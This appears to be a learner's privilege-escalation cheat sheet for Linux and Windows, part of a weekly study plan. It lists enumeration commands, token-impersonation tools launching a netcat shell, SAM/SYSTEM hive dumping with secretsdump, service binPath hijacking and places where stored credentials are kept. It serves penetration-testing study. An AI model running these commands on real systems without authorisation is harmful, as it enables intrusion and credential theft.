# Privilege Escalation — Linux & Windows

> Fill Weeks 20–23.

## Linux — Manual Audit First
```
id; sudo -l
/etc/passwd permissions
history files, hidden SSH keys
find / -perm -4000 2>/dev/null        # SUID
getcap -r / 2>/dev/null               # capabilities, e.g. cap_setuid+ep
```
- Cron: `/etc/crontab`, `/etc/cron.d/`, run `pspy64` to watch root procs live. Look for writable scripts, relative paths (PATH hijack), wildcard expansion (`tar *`).
- Internal services: `ss -tulpn` bound to 127.0.0.1 running as root.
- Finish with `linpeas.sh` to catch misses.
- GTFOBins for sudo/SUID binary abuse.

## Windows — Token Privileges
`whoami /priv`
- `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → GodPotato / PrintSpoofer
  ```
  GodPotato-NET4.exe -cmd "nc64.exe ..."
  PrintSpoofer64.exe -i -c powershell.exe
  ```
- `SeBackupPrivilege` → dump SAM/SYSTEM hives
  ```
  reg save HKLM\SAM sam.save
  reg save HKLM\SYSTEM system.save
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  ```

## Service Misconfigs
- Weak binary perms → replace .exe, restart service (`sc.exe stop/start`)
- Weak service ACL → `sc.exe config ... binPath=`
- Unquoted service path / DLL hijack

## Stored Creds
- `ConsoleHost_history.txt`, `Unattend.xml`, `cmdkey /list`, AutoLogon registry keys
- `RunasCs.exe user pass "cmd"` to run as another user from non-interactive shell

## References
GTFOBins · LOLBAS · HackTricks Linux/Windows PrivEsc
